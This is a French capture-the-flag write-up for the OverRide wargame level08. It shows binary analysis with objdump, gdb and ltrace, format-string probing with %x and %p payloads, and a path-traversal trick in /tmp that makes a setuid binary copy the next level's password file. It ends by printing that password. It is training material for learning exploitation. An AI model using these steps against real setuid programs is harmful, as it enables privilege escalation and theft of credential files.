@@ -1,0 +1,222 @@
+Le niveau 08 est un ELF 64-bit
+
+level08@OverRide:~$ file ./level08
+./level08: setuid setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf8990336d0891364d2754de14a6cc793677b9122, not stripped
+
+level08@OverRide:~$ size ./level08
+   text	   data	    bss	    dec	    hex	filename
+   3217	    640	     16	   3873	    f21	./level08
+
+Il y a une protection Canary et Full RELRO qui empeche la reecriture de la section data et de certaines tables.
+
+level08@OverRide:~$ objdump -R ./level08
+
+./level08:     file format elf64-x86-64
+
+DYNAMIC RELOCATION RECORDS
+OFFSET           TYPE              VALUE
+0000000000601ff8 R_X86_64_GLOB_DAT  __gmon_start__
+0000000000601f80 R_X86_64_JUMP_SLOT  strcpy
+0000000000601f88 R_X86_64_JUMP_SLOT  write
+0000000000601f90 R_X86_64_JUMP_SLOT  fclose
+0000000000601f98 R_X86_64_JUMP_SLOT  __stack_chk_fail
+0000000000601fa0 R_X86_64_JUMP_SLOT  printf
+0000000000601fa8 R_X86_64_JUMP_SLOT  snprintf
+0000000000601fb0 R_X86_64_JUMP_SLOT  strncat
+0000000000601fb8 R_X86_64_JUMP_SLOT  fgetc
+0000000000601fc0 R_X86_64_JUMP_SLOT  close
+0000000000601fc8 R_X86_64_JUMP_SLOT  strcspn
+0000000000601fd0 R_X86_64_JUMP_SLOT  __libc_start_main
+0000000000601fd8 R_X86_64_JUMP_SLOT  fprintf
+0000000000601fe0 R_X86_64_JUMP_SLOT  open
+0000000000601fe8 R_X86_64_JUMP_SLOT  fopen
+0000000000601ff0 R_X86_64_JUMP_SLOT  exit
+
+level08@OverRide:/tmp$ objdump /home/users/level08/level08 -h
+
+/home/users/level08/level08:     file format elf64-x86-64
+
+Sections:
+Idx Name          Size      VMA               LMA               File off  Algn
+  0 .interp       0000001c  0000000000400238  0000000000400238  00000238  2**0
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+  1 .note.ABI-tag 00000020  0000000000400254  0000000000400254  00000254  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+  2 .note.gnu.build-id 00000024  0000000000400274  0000000000400274  00000274  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+  3 .gnu.hash     0000001c  0000000000400298  0000000000400298  00000298  2**3
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+  4 .dynsym       00000198  00000000004002b8  00000000004002b8  000002b8  2**3
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+  5 .dynstr       00000099  0000000000400450  0000000000400450  00000450  2**0
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+  6 .gnu.version  00000022  00000000004004ea  00000000004004ea  000004ea  2**1
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+  7 .gnu.version_r 00000030  0000000000400510  0000000000400510  00000510  2**3
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+  8 .rela.dyn     00000018  0000000000400540  0000000000400540  00000540  2**3
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+  9 .rela.plt     00000168  0000000000400558  0000000000400558  00000558  2**3
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+ 10 .init         00000018  00000000004006c0  00000000004006c0  000006c0  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, CODE
+ 11 .plt          00000100  00000000004006e0  00000000004006e0  000006e0  2**4
+                  CONTENTS, ALLOC, LOAD, READONLY, CODE
+ 12 .text         00000558  00000000004007e0  00000000004007e0  000007e0  2**4
+                  CONTENTS, ALLOC, LOAD, READONLY, CODE
+ 13 .fini         0000000e  0000000000400d38  0000000000400d38  00000d38  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, CODE
+ 14 .rodata       0000009c  0000000000400d48  0000000000400d48  00000d48  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+ 15 .eh_frame_hdr 00000034  0000000000400de4  0000000000400de4  00000de4  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+ 16 .eh_frame     000000c4  0000000000400e18  0000000000400e18  00000e18  2**3
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+ 17 .ctors        00000010  0000000000601d90  0000000000601d90  00001d90  2**3
+                  CONTENTS, ALLOC, LOAD, DATA
+ 18 .dtors        00000010  0000000000601da0  0000000000601da0  00001da0  2**3
+                  CONTENTS, ALLOC, LOAD, DATA
+ 19 .jcr          00000008  0000000000601db0  0000000000601db0  00001db0  2**3
+                  CONTENTS, ALLOC, LOAD, DATA
+ 20 .dynamic      000001b0  0000000000601db8  0000000000601db8  00001db8  2**3
+                  CONTENTS, ALLOC, LOAD, DATA
+ 21 .got          00000098  0000000000601f68  0000000000601f68  00001f68  2**3
+                  CONTENTS, ALLOC, LOAD, DATA
+ 22 .data         00000010  0000000000602000  0000000000602000  00002000  2**3
+                  CONTENTS, ALLOC, LOAD, DATA
+ 23 .bss          00000010  0000000000602010  0000000000602010  00002010  2**3
+                  ALLOC
+ 24 .comment      0000002a  0000000000000000  0000000000000000  00002010  2**0
+                  CONTENTS, READONLY
+
+
+level08@OverRide:~$ ./level08
+Usage: ./level08 filename
+ERROR: Failed to open (null)
+
+level08@OverRide:~$ ./level08 ./level08
+
+level08@OverRide:~$ l
+backups/  level08*
+
+level08@OverRide:~$ ls -lah backups/
+total 8.0K
+drwxrwx---+ 1 level09 users     80 Nov 28 00:45 .
+dr-xr-x---+ 1 level08 level08  100 Oct 19  2016 ..
+-rwxrwx---+ 1 level09 users     48 Nov 28 00:48 .log
+-r--r-----+ 1 level09 users   1.8K Nov 28 00:45 level08
+
+level08@OverRide:~$ cat backups/level08
+@44Q�tR�td��`�`pp/lib64/ld-linux-x86-64.so.2GNUGNU6��d���Muғ�lJ"�{gtK,[zR=LCbZ '&!__gmon_start__libc.so.6strcpyexitfopen__stack_chk_failfgetcstrcspnfclosestrncatfprintf__libc_s�`�`�`�`�`�`�`��`rintfGL�`C_2.4GLIBC_2.2.5ii
+�`
+  �`
+    �`�`�`H��C���-H��
+
+level08@OverRide:~$ file backups/level08
+backups/level08: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), stripped
+
+level08@OverRide:~$ ./level08 /home/users/level09/.pass
+ERROR: Failed to open ./backups//home/users/level09/.pass
+
+level08@OverRide:~$ ./level08 ../../users/level09/.pass
+ERROR: Failed to open ./backups/../../users/level09/.pass
+
+On remarque dans log_wrapper une utilisation de snprintf avec un format string vulnerability exploitable de cette maniere:
+
+level08@OverRide:~$ ./level08 %p
+ERROR: Failed to open %p
+
+level08@OverRide:~$ cat backups/.log
+LOG: Starting back up: 0xffffffffffffffec
+
+level08@OverRide:~$ ./level08 "AAAAAABBBBBBBB %x %x %x %x %x %x %x %x %x %x %x %x %x DDDD"
+ERROR: Failed to open AAAAAABBBBBBBB %x %x %x %x %x %x %x %x %x %x %x %x %x DDDD
+
+level08@OverRide:~$ cat backups/.log
+LOG: Starting back up: AAAAAABBBBBBBB ffffffec ec 400d6c ffffffff ffffe87c 400d96 603010 72617453 63616220 4141203a 42424242 66666620 63652063 DDDD
+
+level08@OverRide:~$ ./level08 "AAAAAABBBBBBBB %10\$p %11\$p %12\$p" || cat backups/.log ERROR: Failed to open AAAAAABBBBBBBB %10$p %11$p %12$p
+LOG: Starting back up: AAAAAABBBBBBBB 0x414141414141203a 0x4242424242424242 0x21020
+
+Essayons de reecrire un appel de fonction qui suit celui du printf vulnerable.
+
+   0x0000000000400996 <+210>:	call   0x400740 <snprintf@plt>
+   0x000000000040099b <+215>:	lea    rax,[rbp-0x110]
+   0x00000000004009a2 <+222>:	mov    esi,0x400d4c
+   0x00000000004009a7 <+227>:	mov    rdi,rax
+   0x00000000004009aa <+230>:	call   0x400780 <strcspn@plt>
+
+(gdb) disass 0x400780
+Dump of assembler code for function strcspn@plt:
+   0x0000000000400780 <+0>:	jmp    QWORD PTR [rip+0x201842]        # 0x601fc8 <_GLOBAL_OFFSET_TABLE_+96>
+   0x0000000000400786 <+6>:	push   0x9
+   0x000000000040078b <+11>:	jmp    0x4006e0
+End of assembler dump.
+
+Le probleme ici est de passer au programme une adresse contenant des \x00 pour reecrire l'adresse 0x201842.
+Nous pourrions aussi envoyer un autre fichier a lire et corrompre la memoire a partir du buffer mais il y a les protections kernel / file et visiblement nous ne pouvons pas overflow sur la memoire avec ce getc.
+
+En re examinant le code on remarque que l'utilisation des fichiers et les verifications pour l'exit du programme laisse entrevoir quelques faiblesses.
+
+level08@OverRide:/$ home/users/level08/level08 home/users/level09/.pass
+ERROR: Failed to open ./backups/.log
+
+Repensons donc a la premiere piste qui etait de se servir du setuid byte pour directement lire le fichier level09/.pass
+
+En premier lieu on essai d'ouvrir le fichier "./backups/.log", litteralement. Le nombre d'argument n'influencera pas cette etape.
+Outre l'utilisation du binaire a la racine avec le directory backups deja present, le seule endroit ou nous pouvons tenter d'ouvrir ce path est dans le dossier tmp qui nous accorde les droits de creation. Ce qui est la seule condition pour passer a la suite de l'execution du code.
+
+level08@OverRide:/tmp$ ll
+total 0
+drwxrwxrwt 3 root    root     60 Nov 30 20:17 ./
+drwxr-xr-x 1 root    root    220 Nov 30 12:33 ../
+drwxrwxr-x 2 level08 level08  60 Nov 30 20:05 backups/
+
+Premier call de log_wrapper, qui mettra dans backups/.log l'information de l'ouverture de notre fichier argument.
+
+level08@OverRide:/tmp$ ltrace /home/users/level08/level08
+__libc_start_main(0x4009f0, 1, 0x7fffffffe688, 0x400c60, 0x400cf0 <unfinished ...>
+printf("Usage: %s filename\n", "/home/users/level08/level08"Usage: /home/users/level08/level08 filename
+) = 44
+fopen("./backups/.log", "w")                           = 0x603010
+strcpy(0x7fffffffe3d0, "Starting back up: ")           = 0x7fffffffe3d0
+snprintf("", 0, "")                                    = -1
+strcspn("Starting back up: ", "\n")                    = 18
+fprintf(0x603010, "LOG: %s\n", "Starting back up: ")   = 24
+fopen(NULL, "r")                                       = 0
+printf("ERROR: Failed to open %s\n", NULLERROR: Failed to open (null)
+)             = 29
+exit(1 <unfinished ...>
++++ exited (status 1) +++
+
+Ouverture de notre fichier argument, si celle-ci echoue le programme exit.
+
+level08@OverRide:/tmp$ /home/users/level08/level08 ../home/users/level09/.pass
+ERROR: Failed to open ./backups/../home/users/level09/.pass
+
+Outre l'echec de cet appel, il s'avere que le programme essai en realite d'ouvrir un parametre qu'il a lui meme cree avec strncat, et qu'ainsi nous pouvons lui fournir une input invalide dans un sens, mais exploitable dans l'autre.
+Creeons alors un faux temporaire.
+
+level08@OverRide:/tmp$ mkdir -p home/users/level09/
+
+level08@OverRide:/tmp$ ll
+total 0
+drwxrwxrwt 4 root    root    100 Dec  1 23:51 ./
+drwxr-xr-x 1 root    root    220 Dec  1 23:28 ../
+drwxrwxr-x 2 level08 level08  80 Dec  1 23:46 backups/
+drwxrwxr-x 3 level08 level08  60 Dec  1 23:51 home/
+-rw-rw-r-- 1 level08 level08   0 Dec  1 23:46 test
+
+level08@OverRide:/tmp$ ll backups/../home/users/level09/
+total 0
+drwxrwxr-x 2 level08 level08 40 Dec  1 23:51 ./
+drwxrwxr-x 3 level08 level08 60 Dec  1 23:51 ../
+
+level08@OverRide:/tmp$ /home/users/level08/level08 ../home/users/level09/.pass
+
+level08@OverRide:/tmp$ cat backups/.log
+LOG: Starting back up: ../home/users/level09/.pass
+LOG: Finished back up ../home/users/level09/.pass
+
+level08@OverRide:/tmp$ cat home/users/level09/.pass
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
